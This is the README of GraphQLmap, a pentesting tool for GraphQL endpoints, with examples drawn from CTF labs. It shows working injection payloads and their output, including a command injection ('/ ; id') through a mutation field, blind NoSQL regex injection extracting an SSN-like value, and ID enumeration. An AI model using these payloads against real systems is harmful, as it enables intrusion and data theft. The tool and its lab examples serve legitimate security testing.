# GraphQLmap

> GraphQLmap is a scripting engine to interact with a graphql endpoint for pentesting purposes.


* [Install](#install)
* [Features and examples](#features-and-examples)
  - [Dump a GraphQL schema](#dump-a-graphql-schema)
  - [Interact with a GraphQL endpoint](#interact-with-a-graphql-endpoint)
  - [Execute GraphQL queries](#)
  - [Autocomplete queries](#)
  - [GraphQL field fuzzing](#graphql-field-fuzzing)
    - [Example 1 - Bruteforce a character](#example-1---bruteforce-a-character)
    - [Example 2 - Iterate over a number](#example-2---iterate-over-a-number)
  - [NoSQL injection inside a GraphQL field](#nosql-injection)
  - [SQL injection inside a GraphQL field](#sqli-injection)

I :heart: pull requests, feel free to improve this script :)

You can also contribute with a :beers: IRL or using Github Sponsoring button.

## Install

```basic
$ git clone https://github.com/swisskyrepo/GraphQLmap
$ python setup.py install
$ graphqlmap                                                              
   _____                 _      ____  _                            
  / ____|               | |    / __ \| |                           
 | |  __ _ __ __ _ _ __ | |__ | |  | | |     _ __ ___   __ _ _ __  
 | | |_ | '__/ _` | '_ \| '_ \| |  | | |    | '_ ` _ \ / _` | '_ \ 
 | |__| | | | (_| | |_) | | | | |__| | |____| | | | | | (_| | |_) |
  \_____|_|  \__,_| .__/|_| |_|\___\_\______|_| |_| |_|\__,_| .__/ 
                  | |                                       | |    
                  |_|                                       |_|    
                                         Author:Swissky Version:1.0
usage: graphqlmap.py [-h] [-u URL] [-v [VERBOSITY]] [--method [METHOD]] [--headers [HEADERS]] [--json [USE_JSON]] [--proxy [PROXY]]

optional arguments:
  -h, --help           show this help message and exit
  -u URL               URL to query : example.com/graphql?query={}
  -v [VERBOSITY]       Enable verbosity
  --method [METHOD]    HTTP Method to use interact with /graphql endpoint
  --headers [HEADERS]  HTTP Headers sent to /graphql endpoint
  --json [USE_JSON]    Use JSON encoding, implies POST
  --proxy [PROXY]      HTTP proxy to log requests
```

Development setup

```ps1
python -m venv .venv
source .venv/bin/activate
pip install --editable .
pip install -r requirements.txt
./bin/graphqlmap -u http://127.0.0.1:5013/graphql
```


## Features and examples

:warning: Examples are based on several CTF challenges from HIP2019.

### Connect to a graphql endpoint

```py
# Connect using POST and providing an authentication token
graphqlmap -u https://yourhostname.com/graphql -v --method POST --headers '{"Authorization" : "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0ZXh0Ijoibm8gc2VjcmV0cyBoZXJlID1QIn0.JqqdOesC-R4LtOS9H0y7bIq-M8AGYjK92x4K3hcBA6o"}'

# Pass request through Burp Proxy
graphqlmap -u "http://172.17.0.1:5013/graphql" --proxy http://127.0.0.1:8080
```

### Dump a GraphQL schema

Use `dump_new` to dump the GraphQL schema, this function will automatically populate the "autocomplete" with the found fields.    
[:movie_camera: Live Example](https://asciinema.org/a/14YuWoDOyCztlx7RFykILit4S)

```powershell
GraphQLmap > dump_new                     
============= [SCHEMA] ===============
e.g: name[Type]: arg (Type!)                   
                                                                                               
Query                                          
        doctor[]: email (String!),                                                             
        doctors[Doctor]:                                                                       
        patients[Patient]:                                                                     
        patient[]: id (ID!),                   
        allrendezvous[Rendezvous]:                                                             
        rendezvous[]: id (ID!),                                                                
Doctor                                         
        id[ID]:                                                                                
        firstName[String]:                     
        lastName[String]:                                                                      
        specialty[String]:                     
        patients[None]: 
        rendezvous[None]: 
        email[String]: 
        password[String]: 
[...]
```


### Interact with a GraphQL endpoint

Write a GraphQL request and execute it.

```powershell
GraphQLmap > {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"Admin\"} }"){firstName lastName id}}
{
    "data": {
        "doctors": [
            {
                "firstName": "Admin",
                "id": "5d089c51dcab2d0032fdd08d",
                "lastName": "Admin"
            }
        ]
    }
}
```

It also works with `mutations`, they must be written in a single line.

```ps1
# ./bin/graphqlmap -u http://127.0.0.1:5013/graphql --proxy http://127.0.0.1:8080 --method POST
GraphQLmap > mutation { importPaste(host:"localhost", port:80, path:"/ ; id", scheme:"http"){ result }}
{
    "data": {
        "importPaste": {
            "result": "uid=1000(dvga) gid=1000(dvga) groups=1000(dvga)\n"
        {
    {
{
```


### GraphQL field fuzzing

Use `GRAPHQL_INCREMENT` and `GRAPHQL_CHARSET` to fuzz a parameter.      
[:movie_camera: Live Example](https://asciinema.org/a/ICCz3PqHVNrBf262x6tQfuwqT)

#### Example 1 - Bruteforce a character

```powershell
GraphQLmap > {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"AdmiGRAPHQL_CHARSET\"} }"){firstName lastName id}}   
[+] Query: (45) {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"Admi!\"} }"){firstName lastName id}}   
[+] Query: (45) {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"Admi$\"} }"){firstName lastName id}}   
[+] Query: (45) {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"Admi%\"} }"){firstName lastName id}}   
[+] Query: (45) {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"Admi(\"} }"){firstName lastName id}}   
[+] Query: (45) {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"Admi)\"} }"){firstName lastName id}}   
[+] Query: (206) {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"Admi*\"} }"){firstName lastName id}}   
[+] Query: (45) {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"Admi+\"} }"){firstName lastName id}}   
[+] Query: (45) {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"Admi,\"} }"){firstName lastName id}}   
[+] Query: (45) {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"Admi-\"} }"){firstName lastName id}}   
[+] Query: (206) {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"Admi.\"} }"){firstName lastName id}}   
[+] Query: (45) {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"Admi/\"} }"){firstName lastName id}}   
[+] Query: (45) {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"Admi0\"} }"){firstName lastName id}}   
[+] Query: (45) {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"Admi1\"} }"){firstName lastName id}}     
[+] Query: (206) {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"Admi?\"} }"){firstName lastName id}}
[+] Query: (206) {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"Admin\"} }"){firstName lastName id}}
```

#### Example 2 - Iterate over a number

Use `GRAPHQL_INCREMENT_` followed by a number.

```powershell
GraphQLmap > { paste(pId: "GRAPHQL_INCREMENT_10") {id,title,content,public,userAgent} }
[+] Query: (45) { paste(pId: "0") {id,title,content,public,userAgent} }
[+] Query: (245) { paste(pId: "1") {id,title,content,public,userAgent} }
[+] Query: (371) { paste(pId: "2") {id,title,content,public,userAgent} }
[+] Query: (309) { paste(pId: "3") {id,title,content,public,userAgent} }
[+] Query: (311) { paste(pId: "4") {id,title,content,public,userAgent} }
[+] Query: (308) { paste(pId: "5") {id,title,content,public,userAgent} }
[+] Query: (375) { paste(pId: "6") {id,title,content,public,userAgent} }
[+] Query: (315) { paste(pId: "7") {id,title,content,public,userAgent} }
[+] Query: (336) { paste(pId: "8") {id,title,content,public,userAgent} }
[+] Query: (377) { paste(pId: "9") {id,title,content,public,userAgent} }

GraphQLmap > { paste(pId: "9") {id,title,content,public,userAgent} }
{ paste(pId: "9") {id,title,content,public,userAgent} }
{
    "data": {
        "paste": {
            "content": "I was excited to spend time with my wife without being interrupted by kids.",
            "id": "UGFzdGVPYmplY3Q6OQ==",
            "public": true,
            "title": "This is my first paste",
            "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0"
        }
    }
}
```

### GraphQL Batching

GraphQL supports Request Batching. Batched requests are processed one after the other by GraphQL
Use `BATCHING_PLACEHOLDER` before a query to send it multiple times inside a single request.

```ps1
GraphQLmap > BATCHING_3 {__schema{ types{namea}}}
[+] Sending a batch of 3 queries
[+] Successfully received 3 outputs

GraphQLmap > BATCHING_2 {systemUpdate}
[+] Sending a batch of 2 queries
[+] Successfully received 2 outputs
```

### NoSQLi injection

Use `BLIND_PLACEHOLDER` inside the query for the `nosqli` function.    
[:movie_camera: Live Example](https://asciinema.org/a/wp2lixHqRV0pxxhZ8nsgUj6s7)

```powershell
GraphQLmap > nosqli
Query > {doctors(options: "{\"\"patients.ssn\":1}", search: "{ \"patients.ssn\": { \"$regex\": \"^BLIND_PLACEHOLDER\"}, \"lastName\":\"Admin\" , \"firstName\":\"Admin\" }"){id, firstName}}
Check > 5d089c51dcab2d0032fdd08d
Charset > 0123456789abcdef-
[+] Data found: 4f537c0a-7da6-4acc-81e1-8c33c02ef3b
GraphQLmap >
```

### SQL injection 

```powershell
GraphQLmap > postgresqli
GraphQLmap > mysqli
GraphQLmap > mssqli
```

## Practice

* [Damn Vulnerable GraphQL Application - @dolevf](https://github.com/dolevf/Damn-Vulnerable-GraphQL-Application/blob/master/setup.py) : `docker run -t -p 5013:5013 -e WEB_HOST=0.0.0.0 dolevf/dvga`

## TODO

* GraphQL Field Suggestions
* Generate mutation query
* Unit tests
* Handle node
```
{
  user {
    edges {
      node {
        username
      }
    }
  }
}
```
